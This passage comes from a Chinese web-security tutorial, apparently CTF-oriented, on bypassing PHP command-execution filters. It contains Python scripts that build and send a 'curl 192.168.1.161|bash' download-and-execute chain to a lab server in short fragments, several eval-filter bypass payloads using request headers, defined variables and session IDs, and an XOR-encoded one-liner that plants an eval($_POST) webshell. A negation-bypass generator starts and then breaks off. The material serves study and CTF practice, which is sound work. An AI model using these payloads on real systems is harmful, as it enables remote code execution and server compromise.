class="string">&quot;&gt;ls\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls&gt;_&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;-t\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\&gt;y&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls&gt;&gt;_&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># curl 192.168.1.161/1|bash</span></span><br><span class="line">list2=[</span><br><span class="line">    <span class="string">&quot;&gt;bash&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\|\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\/\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;61\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;1\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;1.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;8.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;16\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;2.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;19\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;rl\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;cu\\&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">list</span>:</span><br><span class="line">    time.<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="title function_ invoke__">str</span>(i)</span><br><span class="line">    s.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j in list2:</span><br><span class="line">    time.<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="title function_ invoke__">str</span>(j)</span><br><span class="line">    s.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line"></span><br><span class="line">s.<span class="title function_ invoke__">get</span>(baseurl+<span class="string">&quot;sh _&quot;</span>)</span><br><span class="line">s.<span class="title function_ invoke__">get</span>(baseurl+<span class="string">&quot;sh y&quot;</span>)</span><br></pre></td></tr></table></figure><p>如果长度是4的话那么可以采用下面脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">baseurl = <span class="string">&quot;http://192.168.1.6:19080/class09/4/ffff.php?cmd=&quot;</span></span><br><span class="line">s = requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ls -t 写入文件g</span></span><br><span class="line"><span class="keyword">list</span>=[</span><br><span class="line">    <span class="string">&quot;&gt;g\;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;g\&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;ht-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;sl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;dir&quot;</span>,</span><br><span class="line">    <span class="string">&quot;*&gt;v&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;rev&quot;</span>,</span><br><span class="line">    <span class="string">&quot;*v&gt;x&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># curl 192.168.1.161|bash</span></span><br><span class="line">list2= [</span><br><span class="line">    <span class="string">&quot;&gt;ash&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;b\\&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\|\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;A1\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;01\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;A8\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;C0\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;0x\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;rl\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;cu\\&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">list</span>:</span><br><span class="line">    time.<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="title function_ invoke__">str</span>(i)</span><br><span class="line">    s.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j in list2:</span><br><span class="line">    time.<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="title function_ invoke__">str</span>(j)</span><br><span class="line">    s.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line"></span><br><span class="line">s.<span class="title function_ invoke__">get</span>(baseurl+<span class="string">&quot;sh x&quot;</span>)</span><br><span class="line">s.<span class="title function_ invoke__">get</span>(baseurl+<span class="string">&quot;sh g&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以根据自己的情况进行修改Moab那脚本所执行的内容命令。<br>PS：如果是7位的话也可以这样<code>nl /fl*</code></p><h1 id="无参命令执行"><a href="#无参命令执行" class="headerlink" title="无参命令执行"></a>无参命令执行</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先分析一下代码，里面就一个正则的判断，如果规则最终匹配替换到一个<code>;</code>那么就继续运行，否则不执行，其中里面的正则<code>/[^\W]+\((?R)?\)/</code>我们拆解一下分析<code>[^\W]</code>的含义是指<code>A-Za-z0-9_</code>数字字母都会被匹配，然后就是<code>\((?R)?\)</code>递归的去匹配<code>xxx()</code>这种形式的字符串，就是必须带一个<code>()</code>，并且括弧中不允许有任何内容，然后这是一个递归的匹配即<code>a(b(c()))</code>都可以，就是里面不允许有内容，例如<code>phpinfo();</code>最红就会被替换成一个<code>;</code>，我们如果想要执行命令，如果用传统的办法肯定是不行，这里可以采用下面几种绕过的方式。</p><h2 id="请求头绕过"><a href="#请求头绕过" class="headerlink" title="请求头绕过"></a>请求头绕过</h2><p>第一种是我们通过传请求头内容我们可以通过<code>getallheaders()</code>函数获取所有请求头内容，请求头我们也是可以控制的，例如构造一个这样的请求<code>code=print_r(getallheaders());</code>，然后在请求头中再加一个数据，这个随便，看一下回显<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250615195334.png"><br>我在请求头的最后加了一个<code>exec: dir</code>的项，然后通过getallheader()获取了出来，他返回了一个<code>array</code>数组，我们可以通过他自身的一些操作数组的函数来直接获取到第一个的数据例如<code>pos()</code>或者最后一个<code>end()</code>，我们再次构造code为<code>print_r(pos(getallheaders()));</code>，回显内容即变成了<code>dir</code>,如下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250615195615.png"></p><p>这个时候就比较好理解了，print_r直接包裹一个system即可执行命令<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250615195649.png"><br>然后就是还有一个<code>apache_request_headers()</code>函数效果一样，但是这个应该是需要一个apache的支持。需要注意的是，header传入的时候需要放到最后面才是里面数组的第一个，或则放到最前面，用<code>end()</code>获取最后一个。</p><h2 id="全局变量绕过"><a href="#全局变量绕过" class="headerlink" title="全局变量绕过"></a>全局变量绕过</h2><p>第二种是通过全局变量的形式来做命令执行的绕过，环境变量可以通过函数<code>get_defined_vars()</code>来获取，我们可以通过<code>print_r(get_defined_vars());</code>来获取他的内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250615200624.png"><br>他会返回所有当前定义的变量，并且依旧是数组的形式，格式化之后是长这个样子<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250615201510.png"><br>GET数组中有咱们刚才传入的参数，并且还是个数组，我们依旧可以通过这个去绕过，例如构造一个这样的payload<code>?code=print_r(end(pos(get_defined_vars())));&amp;exec=dir</code>，返回值如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250615201700.png"><br>这里就比较简单了我们直接把<code>print_r</code>替换成<code>system</code>即可<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250615201802.png"></p><h2 id="SESSION绕过"><a href="#SESSION绕过" class="headerlink" title="SESSION绕过"></a>SESSION绕过</h2><p>第三种方法是通过session绕过，但是他应该是之能在php5中使用，下面介绍两个函数<code>session_start()</code>和<code>session_id()</code>第一个start是如果当前传入了sessionid的话则返回true，也就是1，然后第二个id，如果传入的内容是true，那么他就会返回当前的sessionid，sessionid我们是可以控制的，在burp中抓包可以直接修改他，我们构造一个这样的payload<code>print_r(session_id(session_start()));</code>，然后修改sessionid为<code>cat$IFS/flag</code>去发送请求，返回值如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250615203328.png"><br>到这里的话我们就可以直接把print_r修改成system了。</p><h2 id="其他的方法"><a href="#其他的方法" class="headerlink" title="其他的方法"></a>其他的方法</h2><p>绕过这个的方法有很多很多，如果前面几种都不可以使用那么你就可以通过当前的方法来做了，具体思路就是通过php的一些内置函数获取当前目录或者获取目录的内容，然后通过php内置的函数，例如获取第一个或者最后一个，再去通过一些read函数的组合来读取flag，总之就是各种的函数拼接，这里不去细说了，因为太多了，做到这里就可以用ai来去查询一些相关的函数了，其实操作空间很大，因为并没有禁止咱们去执行的内容，只是不让传参。</p><h1 id="可逆运算绕过"><a href="#可逆运算绕过" class="headerlink" title="可逆运算绕过"></a>可逆运算绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先分析一下代码，他这里存在一个正则的验证，不能有大小写字母a-z然后不能有0-9，也就是说所有的字母和数字都被过滤了，这种只能输入符号来解决，这种的过滤可以通过下面几种方法绕过。</p><h2 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h2><p>异或是干什么事的这里不多说，不了解的话可以参考这篇文章<code>https://www.ruanyifeng.com/blog/2021/01/_xor.html</code>，这里主要是通过可见字符去异或可见字符拿到一个他限制的内容，具体可以通过下面脚本来爆破对应文本所需的异或符号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或运算第一部分： &quot;</span>.<span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或运算第二部分： &quot;</span>.<span class="variable">$result2</span>;</span><br></pre></td></tr></table></figure><p>例如我们想要执行<code>phpinfo</code>，他返回的内容是</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">异或运算第一部分： +(+).&amp;/</span><br><span class="line">异或运算第二部分： [@[@@@@</span><br></pre></td></tr></table></figure><p>我们可以构造一个<code>$_=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;;$_()</code>的方式来去执行它，返回值如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250615210632.png"><br>需要注意的是，符号存在<code>+</code>，它会被自动解析成空格，我们需要给他加一层url编码，如果要执行命令则可以构造一个一句话木马来执行，这个转换还有编码其实蛮麻烦的，我这里直接给出一个通用的，如果不行的话大家可以通过上面脚本自己去生成对应的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[%<span class="number">27</span>a%<span class="number">27</span>])</span><br></pre></td></tr></table></figure><p>上面这个实际就是代表<code>eval($_POST[&#39;a&#39;])</code>，去post中转入命令即可<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250615212015.png"></p><h2 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h2><p>简单认识一下取反，以字符<code>a</code>为例，拿到他的2进制那就是<code>01100001</code>，具体可以通过python去获取他们的二进制<code>print(bin(ord(&quot;a&quot;)))</code>，如果对a进行取反，那么最终的值就是从<code>01100001</code>-&gt;<code>10011110</code>，这个值是<code>9E</code>，通过url编码最后拿到一个中文字符<code>极</code>。我们如果输入的内容是一个中文<code>极</code>，再给他加一个取反符号，那么他就会是一个<code>a</code>，如果要再php中取反可以使用<code>~(&quot;极&quot;)</code>这样。然后给出一个生成取反绕过的一个网页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span 